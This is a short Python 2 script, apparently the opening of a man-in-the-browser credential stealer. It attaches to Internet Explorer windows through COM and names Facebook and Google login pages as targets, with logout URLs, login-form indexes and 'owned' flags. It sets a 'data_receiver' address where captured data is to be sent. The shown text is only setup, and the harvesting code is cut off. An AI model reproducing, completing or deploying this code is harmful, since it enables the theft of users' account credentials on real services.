import win32com.client
import time
import urlparse
import urllib

data_receiver = "http://localhost:8080/"
target_sites = {}
target_sites["www.facebook.com"] = {"logout_url": None,
"logout_form": "logout_form",
"login_form_index": 0,
"owned" : False}

target_sites["accounts.google.com"] = {"logout_url": "https://accounts.google.com/Logout?hl=en&continue=https://accounts.google.com/ServiceLogin%3Fservice%3Dmail",
"logout_form" : None,
"login_form_index" : 0,
"owned" : False }

# use the same target for multiple Gmail domains
target_sites["www.gmail.com"] = target_sites["accounts.google.com"]
target_sites["mail.google.com"] = target_sites["accounts.google.com"]
clsid='{9BA05972-F6A8-11CF-A442-00A0C90A8F39}'
windows = win32com.client.Dispatch(clsid)
